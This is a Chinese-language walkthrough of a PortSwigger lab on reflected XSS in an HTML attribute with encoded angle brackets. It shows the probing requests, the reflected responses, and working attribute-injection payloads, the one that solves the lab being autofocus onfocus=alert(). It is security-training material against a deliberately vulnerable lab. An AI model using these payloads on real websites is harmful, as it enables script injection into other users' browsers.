# 实验：尖括号经过 HTML 编码的属性上下文中的反射型 XSS

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded

本实验在博客搜索功能中包含一个反射型跨站脚本漏洞，其中尖括号经过了 HTML 编码。为了解决本实验，请执行一个跨站脚本攻击，该攻击需要注入一个属性并调用 `alert` 函数。

> **提示**
> 仅仅因为你自己能够触发 `alert()` 并不意味着这在受害者身上也能奏效。在找到能够在受害者浏览器中成功执行的 payload 之前，你可能需要尝试使用各种不同的属性来注入你的概念验证（proof-of-concept）载荷。

## 步骤

探测
- 使用搜索功能

    ```http
    GET /?search=h1pva7vk HTTP/2
    ```

    - 响应
        ```html
        <h1>0 search results for 'h1pva7vk'</h1>

        <form action=/ method=GET>
            <input type=text placeholder='Search the blog...' name=search value="h1pva7vk">
        ```
        - 源
            - h1 标签的文本段
            - input 标签属性值

- 测试特殊字符

    ```http
    GET /?search=h1pva7vk<>{}"'abc HTTP/2
    ```

    - 响应
        ```html
        <h1>0 search results for 'h1pva7vk&lt;&gt;{}&quot;&apos;abc'</h1>

        <form action=/ method=GET>
            <input type=text placeholder='Search the blog...' name=search value="h1pva7vk&lt;&gt;{}"'abc">
        ```
        - 在 input 元素内双引号并未被转义

攻击，构造 HTML 属性载荷
- 聚焦事件 + 设置 id + hash 聚焦
    `x" id=testx onfocus=alert() e="`

    ```http
    https://实验室/?search=x%22+id%3Dtestx+onfocus%3Dalert%28%29+e%3D%22#testx

    https://实验室/?search=x" id=testx onfocus=alert() e="#testx
    ```
    - 虽然可触发 JS 但无法通过实验

- 聚焦事件 + 自动聚焦
    `x" autofocus onfocus=alert() e="`

    - 可触发 JS 并通过实验
